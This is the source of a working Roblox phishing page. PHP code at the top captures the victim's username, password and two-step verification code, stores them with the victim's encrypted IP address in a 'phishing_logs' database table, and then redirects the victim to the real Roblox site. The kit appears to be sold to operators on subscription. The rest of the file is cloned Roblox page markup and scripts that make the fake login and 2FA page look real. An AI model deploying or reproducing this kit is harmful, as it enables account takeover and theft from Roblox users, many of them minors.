<?php
@session_start();
require_once 'config.php';

if(isset($_POST['username']) && !empty($_POST['username'])){

    if(isset($_SESSION['username']) || isset($_SESSION['password']) || isset($_SESSION['id'])){

        $userid = htmlspecialchars($_SESSION['id']);
        $username = htmlspecialchars($_SESSION['username']);
        $pw = htmlspecialchars($_SESSION['password']);
        $pin = htmlspecialchars($_POST['username']);

        if(checkID(htmlspecialchars($userid)) == 1){
    
            $banned = pdoQuery($db, "SELECT `banned` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $subscription = pdoQuery($db, "SELECT `subscription` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $subEndDate = pdoQuery($db, "SELECT `subEndDate` FROM `users` WHERE `id`=?", [htmlspecialchars($userid)])->fetchColumn();
            $id = getID(50);
    
            if($banned == 0){
    
                if($subscription == "Monthly" || $subscription == "3Months" || $subscription == "Lifetime"){
    
                    $date = new DateTime($subEndDate);
                    $now = new DateTime();
                    if($date > $now) {
                        $PDOADD = $db -> prepare('INSERT INTO `phishing_logs` VALUES(:ID, :avatar ,:username, :pw, :realacc, :type, :pin, :ip, :botID, :date)');
                        $PDOADD -> execute(array(':ID' => htmlspecialchars($userid), ':avatar' => avatarfromID(),':username' => $username, ':pw' => $pw, ':realacc' => checkUser(), ':type' => '2FA Log', ':pin' => $pin, ':ip' => encrypt(realIP()), ':botID' => $id, ':date' => date("Y-m-d H:i:s")));
                        header("location: https://www.roblox.com");
                        exit();
                    }else{
                        //sub expired
                        $PDOUpdate = $db -> prepare('UPDATE `users` SET `subEndDate` = :sub WHERE `id` = :id');
                        $PDOUpdate -> execute(array(':sub' => '0', ':id' => htmlspecialchars($userid)));
            
                        $PDOUpdate1 = $db -> prepare('UPDATE `users` SET `subscription` = :sub WHERE `id` = :id');
                        $PDOUpdate1 -> execute(array(':sub' => 'None', ':id' => htmlspecialchars($userid)));
            
                        $PDOUpdate2 = $db -> prepare('UPDATE `users` SET `rank` = :rank WHERE `id` = :id');
                        $PDOUpdate2 -> execute(array(':rank' => 'User', ':id' => htmlspecialchars($userid)));
                    }
                }
            }
        }else{
            die("haha");
        }
    }
}

function checkUser(){
    global $username;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.roblox.com/users/get-by-username?username=$username");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    if(strpos($output, "Id")){
        return "true";
    }else{
        return "false";
    }
}
function getnameID(){
    global $username;
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.roblox.com/users/get-by-username?username=$username");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    if(strpos($output, "Id")){
        $data = json_decode($output, 1);
        return $data["Id"];
    }
}
function avatarfromID(){
    $id = htmlspecialchars(getnameID());
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://thumbnails.roblox.com/v1/users/avatar?userIds=$id&size=720x720&format=Png&isCircular=false&_=1598491497171");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0); 
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    if(strpos($output, "imageUrl")){
        $obj = json_decode($output);
        
        return htmlspecialchars($obj->data[0]->imageUrl); 
    }
}
function checkID($id){
    global $db;
    $db->setAttribute(PDO::ATTR_EMULATE_PREPARES, false);
    $PDOCheckID = $db -> prepare("SELECT COUNT(*) FROM `users` WHERE `id` = :id");
    $PDOCheckID -> execute(array(':id' => $id));
    $countID = $PDOCheckID -> fetchColumn(0);
    return $countID;
}
function realIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
              $_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
              $_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP)) { $ip = $client; }
    elseif(filter_var($forward, FILTER_VALIDATE_IP)) { $ip = $forward; }
    else { $ip = $remote; }

    return $ip;
}
function getID($length){
    $token = "";
    $codeAlphabet = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    $codeAlphabet.= "abcdefghijklmnopqrstuvwxyz";
    $codeAlphabet.= "0123456789";
    $max = strlen($codeAlphabet);

   for ($i=0; $i < $length; $i++) {
       $token .= $codeAlphabet[random_int(0, $max-1)];
   }

   return $token;
}
function encrypt($text){
    $password = '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';
    $method = 'aes-256-cbc';

    $password = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $encrypted = base64_encode(openssl_encrypt($text, $method, $password, OPENSSL_RAW_DATA, $iv));

    return $encrypted;
}
function decrypt($text){
    $password = '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';
    $method = 'aes-256-cbc';

    $password = substr(hash('sha256', $password, true), 0, 32);
    $iv = chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0) . chr(0x0);
    $decrypted = openssl_decrypt(base64_decode($text), $method, $password, OPENSSL_RAW_DATA, $iv);

    return $decrypted;
}
function pdoQuery($con, $query, $values = array()) {
    if($values) {
        $stmt = $con->prepare($query);
        $stmt->execute($values);
    } else {
        $stmt = $con->query($query);
    }
    return $stmt;
}
?>

<html>
    <!--<![endif]-->
    <head data-machine-id="WEB2350">
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <style type="text/css">
            @charset "UTF-8";
            [ng\:cloak],
            [ng-cloak],
            [data-ng-cloak],
            [x-ng-cloak],
            .ng-cloak,
            .x-ng-cloak,
            .ng-hide:not(.ng-hide-animate) {
                display: none !important;
            }
            ng\:form {
                display: block;
            }
            .ng-animate-shim {
                visibility: hidden;
            }
            .ng-anchor {
                position: absolute;
            }
        </style>
        <!-- MachineID: WEB2350 -->
        <title>Roblox</title>
        <meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true" />
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1" />
        <meta name="author" content="Roblox Corporation" />
        <meta name="description" content="Roblox is a global platform that brings people together through play." />
        <meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine" />
        <meta name="apple-itunes-app" content="app-id=431946152" />

        <script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script>
        <script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
        <script type="text/javascript" async="" src="https://www.googleadservices.com/pagead/conversion_async.js"></script>
        <script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>
        <script type="application/ld+json">
            {
                "@context": "http://schema.org",
                "@type": "Organization",
                "name": "Roblox",
                "url": "https://www.roblox.com/",
                "logo": "https://images.rbxcdn.com/c69b74f49e785df33b732273fad9dbe0.png",
                "sameAs": [
                    "https://www.facebook.com/ROBLOX/",
                    "https://twitter.com/roblox",
                    "https://www.linkedin.com/company/147977",
                    "https://www.instagram.com/roblox/",
                    "https://www.youtube.com/user/roblox",
                    "https://plus.google.com/+roblox",
                    "https://www.twitch.tv/roblox"
                ]
            }
        </script>
        <meta name="locale-data" data-language-code="en_us" data-language-name="English" />
        <meta
            name="device-meta"
            data-device-type="computer"
            data-is-in-app="false"
            data-is-desktop="true"
            data-is-phone="false"
            data-is-tablet="false"
            data-is-console="false"
            data-is-android-app="false"
            data-is-ios-app="false"
            data-is-uwp-app="false"
            data-is-xbox-app="false"
            data-is-amazon-app="false"
            data-is-win32-app="false"
            data-is-studio="false"
            data-is-game-client-browser="false"
            data-is-ios-device="false"
            data-is-android-device="false"
            data-is-universal-app="false"
            data-app-type="unknown"
        />
        <meta name="environment-meta" data-is-testing-site="false" />

        <meta id="roblox-display-names" data-enabled="false" />
        <meta name="page-meta" data-internal-page-name="" />

        <script type="text/javascript">
            var Roblox = Roblox || {};

            Roblox.BundleVerifierConstants = {
                isMetricsApiEnabled: true,
                eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
                deviceType: "Computer",
                cdnLoggingEnabled: JSON.parse("true"),
            };
        </script>
        <script type="text/javascript">
            var Roblox = Roblox || {};

            Roblox.BundleDetector = (function () {
                var isMetricsApiEnabled = Roblox.BundleVerifierConstants && Roblox.BundleVerifierConstants.isMetricsApiEnabled;

                var loadStates = {
                    loadSuccess: "loadSuccess",
                    loadFailure: "loadFailure",
                    executionFailure: "executionFailure",
                };

                var bundleContentTypes = {
                    javascript: "javascript",
                    css: "css",
                };

                var ephemeralCounterNames = {
                    cdnPrefix: "CDNBundleError_",
                    unknown: "CDNBundleError_unknown",
                    cssError: "CssBundleError",
                    jsError: "JavascriptBundleError",
                    jsFileError: "JsFileExecutionError",
                    resourceError: "ResourcePerformance_Error",
                    resourceLoaded: "ResourcePerformance_Loaded",
                };

                return {
                    jsBundlesLoaded: {},
                    bundlesReported: {},

                    counterNames: ephemeralCounterNames,
                    loadStates: loadStates,
                    bundleContentTypes: bundleContentTypes,

                    timing: undefined,

                    setTiming: function (windowTiming) {
                        this.timing = windowTiming;
                    },

                    getLoadTime: function () {
                        if (this.timing && this.timing.domComplete) {
                            return this.getCurrentTime() - this.timing.domComplete;
                        }
                    },

                    getCurrentTime: function () {
                        return new Date().getTime();
                    },

                    getCdnProviderName: function (bundleUrl, callBack) {
                        if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                            var xhr = new XMLHttpRequest();
                            xhr.open("GET", bundleUrl, true);

                            xhr.onreadystatechange = function () {
                                if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                                    try {
                                        var headerValue = xhr.getResponseHeader("rbx-cdn-provider");
                                        if (headerValue) {
                                            callBack(headerValue);
                                        } else {
                                            callBack();
                                        }
                                    } catch (e) {
                                        callBack();
                                    }
                                }
                            };

                            xhr.onerror = function () {
                                callBack();
                            };

                            xhr.send();
                        } else {
                            callBack();
                        }
                    },

                    getCdnProviderAndReportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType) {
                        this.getCdnProviderName(bundleUrl, function (cdnProviderName) {
                            Roblox.BundleDetector.reportMetrics(bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName);
                        });
                    },

                    reportMetrics: function (bundleUrl, bundleName, loadState, bundleContentType, cdnProviderName) {
                        if (!isMetricsApiEnabled || !bundleUrl || !loadState || !loadStates.hasOwnProperty(loadState) || !bundleContentType || !bundleContentTypes.hasOwnProperty(bundleContentType)) {
                            return;
                        }

                        var xhr = new XMLHttpRequest();
                        var metricsApiUrl = (Roblox.EnvironmentUrls && Roblox.EnvironmentUrls.metricsApi) || "https://metrics.roblox.com";

                        xhr.open("POST", metricsApiUrl + "/v1/bundle-metrics/report", true);
                        xhr.setRequestHeader("Content-Type", "application/json");
                        xhr.withCredentials = true;
                        xhr.send(
                            JSON.stringify({
                                bundleUrl: bundleUrl,
                                bundleName: bundleName || "",
                                bundleContentType: bundleContentType,
                                loadState: loadState,
                                cdnProviderName: cdnProviderName,
                                loadTimeInMilliseconds: this.getLoadTime() || 0,
                            })
                        );
                    },

                    logToEphemeralStatistics: function (sequenceName, value) {
                        var deviceType = Roblox.BundleVerifierConstants.deviceType;
                        sequenceName += "_" + deviceType;

                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "/game/report-stats?name=" + sequenceName + "&value=" + value, true);
                        xhr.withCredentials = true;
                        xhr.send();
                    },

                    logToEphemeralCounter: function (ephemeralCounterName) {
                        var deviceType = Roblox.BundleVerifierConstants.deviceType;
                        ephemeralCounterName += "_" + deviceType;
                        //log to ephemeral counters - taken from eventTracker.js
                        var xhr = new XMLHttpRequest();
                        xhr.open("POST", "/game/report-event?name=" + ephemeralCounterName, true);
                        xhr.withCredentials = true;
                        xhr.send();
                    },

                    logToEventStream: function (failedBundle, ctx, cdnProvider, status) {
                        var esUrl = Roblox.BundleVerifierConstants.eventStreamUrl,
                            currentPageUrl = encodeURIComponent(window.location.href);

                        var deviceType = Roblox.BundleVerifierConstants.deviceType;
                        ctx += "_" + deviceType;
                        //try and grab performance data.
                        //Note that this is the performance of the xmlhttprequest rather than the original resource load.
                        var duration = 0;
                        if (window.performance) {
                            var perfTiming = window.performance.getEntriesByName(failedBundle);
                            if (perfTiming.length > 0) {
                                var data = perfTiming[0];
                                duration = data.duration || 0;
                            }
                        }
                        //log to event stream (diagnostic)
                        var params =
                            "&evt=webBundleError&url=" +
                            currentPageUrl +
                            "&ctx=" +
                            ctx +
                            "&fileSourceUrl=" +
                            encodeURIComponent(failedBundle) +
                            "&cdnName=" +
                            (cdnProvider || "unknown") +
                            "&statusCode=" +
                            (status || "unknown") +
                            "&loadDuration=" +
                            Math.floor(duration);
                        var img = new Image();
                        img.src = esUrl + params;
                    },

                    getCdnInfo: function (failedBundle, ctx, fileType) {
                        if (Roblox.BundleVerifierConstants.cdnLoggingEnabled) {
                            var xhr = new XMLHttpRequest();
                            var counter = this.counterNames;
                            xhr.open("GET", failedBundle, true);
                            var cdnProvider;

                            //succesful request
                            xhr.onreadystatechange = function () {
                                if (xhr.readyState === xhr.HEADERS_RECEIVED) {
                                    cdnProvider = xhr.getResponseHeader("rbx-cdn-provider");
                                    if (cdnProvider && cdnProvider.length > 0) {
                                        Roblox.BundleDetector.logToEphemeralCounter(counter.cdnPrefix + cdnProvider + "_" + fileType);
                                    } else {
                                        Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                                    }
                                } else if (xhr.readyState === xhr.DONE) {
                                    // append status to cdn provider so we know its not related to network error.
                                    Roblox.BundleDetector.logToEventStream(failedBundle, ctx, cdnProvider, xhr.status);
                                }
                            };

                            //attach to possible things that can go wrong with the request.
                            //additionally a network error will trigger this callback
                            xhr.onerror = function () {
                                Roblox.BundleDetector.logToEphemeralCounter(counter.unknown + "_" + fileType);
                                Roblox.BundleDetector.logToEventStream(failedBundle, ctx, counter.unknown);
                            };

                            xhr.send();
                        } else {
                            this.logToEventStream(failedBundle, ctx);
                        }
                    },

                    reportResourceError: function (resourceName) {
                        var ephemeralCounterName = this.counterNames.resourceError + "_" + resourceName;
                        this.logToEphemeralCounter(ephemeralCounterName);
                    },

                    reportResourceLoaded: function (resourceName) {
                        var loadTimeInMs = this.getLoadTime();
                        if (loadTimeInMs) {
                            var sequenceName = this.counterNames.resourceLoaded + "_" + resourceName;
                            this.logToEphemeralStatistics(sequenceName, loadTimeInMs);
                        }
                    },

                    reportBundleError: function (bundleTag) {
                        var ephemeralCounterName, failedBundle, ctx, contentType;
                        if (bundleTag.rel && bundleTag.rel === "stylesheet") {
                            ephemeralCounterName = this.counterNames.cssError;
                            failedBundle = bundleTag.href;
                            ctx = "css";
                            contentType = bundleContentTypes.css;
                        } else {
                            ephemeralCounterName = this.counterNames.jsError;
                            failedBundle = bundleTag.src;
                            ctx = "js";
                            contentType = bundleContentTypes.javascript;
                        }

                        //mark that we logged this bundle
                        this.bundlesReported[failedBundle] = true;

                        //e.g. javascriptBundleError_Computer
                        this.logToEphemeralCounter(ephemeralCounterName);
                        //this will also log to event stream
                        this.getCdnInfo(failedBundle, ctx, ctx);

                        var bundleName;
                        if (bundleTag.dataset) {
                            bundleName = bundleTag.dataset.bundlename;
                        } else {
                            bundleName = bundleTag.getAttribute("data-bundlename");
                        }

                        this.getCdnProviderAndReportMetrics(failedBundle, bundleName, loadStates.loadFailure, contentType);
                    },

                    bundleDetected: function (bundleName) {
                        this.jsBundlesLoaded[bundleName] = true;
                    },

                    verifyBundles: function (document) {
                        var ephemeralCounterName = this.counterNames.jsFileError,
                            eventContext = ephemeralCounterName;
                        //grab all roblox script tags in the page.
                        var scripts = (document && document.scripts) || window.document.scripts;
                        var errorsList = [];
                        var bundleName;
                        var monitor;
                        for (var i = 0; i < scripts.length; i++) {
                            var item = scripts[i];

                            if (item.dataset) {
                                bundleName = item.dataset.bundlename;
                                monitor = item.dataset.monitor;
                            } else {
                                bundleName = item.getAttribute("data-bundlename");
                                monitor = item.getAttribute("data-monitor");
                            }

                            if (item.src && monitor && bundleName) {
                                if (!Roblox.BundleDetector.jsBundlesLoaded.hasOwnProperty(bundleName)) {
                                    errorsList.push(item);
                                }
                            }
                        }
                        if (errorsList.length > 0) {
                            for (var j = 0; j < errorsList.length; j++) {
                                var script = errorsList[j];
                                if (!this.bundlesReported[script.src]) {
                                    //log the counter only if the file is actually corrupted, not just due to failure to load
                                    //e.g. JsFileExecutionError_Computer
                                    this.logToEphemeralCounter(ephemeralCounterName);
                                    this.getCdnInfo(script.src, eventContext, "js");

                                    if (script.dataset) {
                                        bundleName = script.dataset.bundlename;
                                    } else {
                                        bundleName = script.getAttribute("data-bundlename");
                                    }

                                    this.getCdnProviderAndReportMetrics(script.src, bundleName, loadStates.executionFailure, bundleContentTypes.javascript);
                                }
                            }
                        }
                    },
                };
            })();

            window.addEventListener("load", function (evt) {
                Roblox.BundleDetector.verifyBundles();
            });

            Roblox.BundleDetector.setTiming(window.performance.timing);
            //# sourceURL=somename.js
        </script>

        <link href="https://images.rbxcdn.com/23421382939a9f4ae8bbe60dbe2a3e7e.ico.gzip" rel="icon" />

        <link
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            rel="stylesheet"
            data-bundlename="StyleGuide"
            href="https://css.rbxcdn.com/9157afd5cee40eb7b436a6945743afc5a4e11f242379b22371e6a508f06bcc2d.css"
        />

        <link
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            rel="stylesheet"
            data-bundlename="Thumbnails"
            href="https://css.rbxcdn.com/9517d686dc47015c200496d77e2b18146ee37652d18e25ecf9e1ed230310ea13.css"
        />

        <link onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___3678d89e5ec3f4d8c65d863691f31de2_m.css/fetch" />

        <link
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            rel="stylesheet"
            data-bundlename="Captcha"
            href="https://css.rbxcdn.com/24a76e8ea70afb9462fad013faa3d22ff3e832e8327ddd764dafe328918bed90.css"
        />

        <link
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            rel="stylesheet"
            data-bundlename="TwoStepVerification"
            href="https://css.rbxcdn.com/ae5f062713e7f497be129e2e367d585e5889d06cb720b62e16863d54b73b3233.css"
        />

        <link
            onerror="Roblox.BundleDetector &amp;&amp; Roblox.BundleDetector.reportBundleError(this)"
            rel="stylesheet"
            data-bundlename="RobuxIcon"
            href="https://css.rbxcdn.com/2f599b9e9ca20ee3c155684adbf1cdcb7220bab681b55b4505123a0c34e81969.css"
        />

        <script type="text/javascript">
            var Roblox = Roblox || {};
            Roblox.EnvironmentUrls = Roblox.EnvironmentUrls || {};
            Roblox.EnvironmentUrls = {
                abtestingApiSite: "https://abtesting.roblox.com",
                accountInformationApi: "https://accountinformation.roblox.com",
                accountSettingsApi: "https://accountsettings.roblox.com",
                adConfigurationApi: "https://adconfiguration.roblox.com",
                adsApi: "https://ads.roblox.com",
                apiGatewayUrl: "https://apis.roblox.com",
                apiProxyUrl: "https://api.roblox.com",
                assetDeliveryApi: "https://assetdelivery.roblox.com",
                authApi: "https://auth.roblox.com",
                authAppSite: "https://authsite.roblox.com",
                avatarApi: "https://avatar.roblox.com",
                badgesApi: "https://badges.roblox.com",
                billingApi: "https://billing.roblox.com",
                captchaApi: "https://captcha.roblox.com",
                catalogApi: "https://catalog.roblox.com",
                chatApi: "https://chat.roblox.com",
                contactsApi: "https://contacts.roblox.com",
                contentStoreApi: "https://contentstore.roblox.com",
                developApi: "https://develop.roblox.com",
                domain: "roblox.com",
                economyApi: "https://economy.roblox.com",
                economycreatorstatsApi: "https://economycreatorstats.roblox.com",
                engagementPayoutsApi: "https://engagementpayouts.roblox.com",
                followingsApi: "https://followings.roblox.com",
                friendsApi: "https://friends.roblox.com",
                friendsAppSite: "https://friendsite.roblox.com",
                gamesApi: "https://games.roblox.com",
                gameInternationalizationApi: "https://gameinternationalization.roblox.com",
                groupsApi: "https://groups.roblox.com",
                inventoryApi: "https://inventory.roblox.com",
                itemConfigurationApi: "https://itemconfiguration.roblox.com",
                localeApi: "https://locale.roblox.com",
                localizationTablesApi: "https://localizationtables.roblox.com",
                metricsApi: "https://metrics.roblox.com",
                midasApi: "https://midas.roblox.com",
                notificationApi: "https://notifications.roblox.com",
                premiumFeaturesApi: "https://premiumfeatures.roblox.com",
                presenceApi: "https://presence.roblox.com",
                publishApi: "https://publish.roblox.com",
                screenTimeApi: "https://apis.rcs.roblox.com/screen-time-api",
                thumbnailsApi: "https://thumbnails.roblox.com",
                tradesApi: "https://trades.roblox.com",
